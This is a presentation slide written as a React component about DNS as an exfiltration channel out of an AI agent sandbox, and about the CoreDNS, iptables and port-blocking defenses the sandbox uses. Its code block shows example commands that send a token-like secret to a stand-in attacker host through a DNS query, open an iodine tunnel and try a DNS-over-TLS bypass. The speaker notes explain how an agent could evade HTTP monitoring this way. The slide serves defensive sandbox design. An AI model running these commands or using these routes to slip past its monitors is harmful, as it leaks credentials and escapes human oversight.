export default function Slide17DnsExfiltration() {
  return (
    <div className="slide" style={{ display: 'flex', flexDirection: 'column', fontSize: '1.26em' }}>
      <h2>🕵️ DNS: The Exfiltration Channel</h2>
      <p className="lede">HTTP allowlists don't constrain DNS. DNS is not HTTP.</p>

      <div className="dns-grid">
        <div className="dns-box bad">
          <h3>What exfiltration looks like</h3>
          <ul>
            <li>Encode secrets as subdomain labels and query attacker-controlled zones</li>
            <li>Route all traffic as DNS queries to bypass the sandbox entirely (<code>iodine</code>)</li>
            <li>Try encrypted DNS on port <code>853</code> to bypass HTTP controls</li>
          </ul>
          <pre style={{ marginTop: '0.6em', fontSize: '0.75em' }}><code>{`# secret encoded in subdomain
dig GHPAT_abc123XYZ.exfil.attacker.io

# iodine DNS tunnel
iodine -f attacker.io

# DNS-over-TLS bypass attempt
dig @attacker.io +tls secret.attacker.io`}</code></pre>
        </div>

        <div className="dns-box good">
          <h3>How this sandbox blocks it</h3>
          <ul>
            <li>CoreDNS is generated from the same <code>allow-list.yaml</code> source of truth</li>
            <li>UDP and TCP <code>53</code> are redirected into that resolver</li>
            <li>Port <code>853</code>, <code>5353</code>, <code>8853</code>, and IPv6 outbound are rejected</li>
          </ul>
        </div>
      </div>
      <div className="callout" style={{ marginTop: '1em' }}>
        ⚠️ Current limitation: DNS policy is <strong>zone-based</strong>, not exact-host-based. Allowing
        <code> github.com </code> at the HTTP layer can still permit lookups under the <code>github.com</code> zone.
      </div>
      <aside className="notes">
        DNS is a classic covert channel that bypasses HTTP-level controls entirely.
        An agent can encode secrets as subdomain labels, small UDP queries that are
        invisible to mitmproxy.

        The CoreDNS Corefile is generated at image build time from the same allow-list.yaml
        that mitmproxy uses. HTTP and DNS policy share a single source of truth.

        iptables ensures CoreDNS is the only process that can reach Docker's internal
        resolver directly. Everything else is redirected to CoreDNS first.

        DNS-over-TLS on port 853 is an encrypted DNS channel that would bypass CoreDNS
        entirely. Port 853 is explicitly rejected outbound.

        QUIC is blocked for the same reason as in HTTP, UDP 443 bypasses TCP interception.
      </aside>
    </div>
  )
}
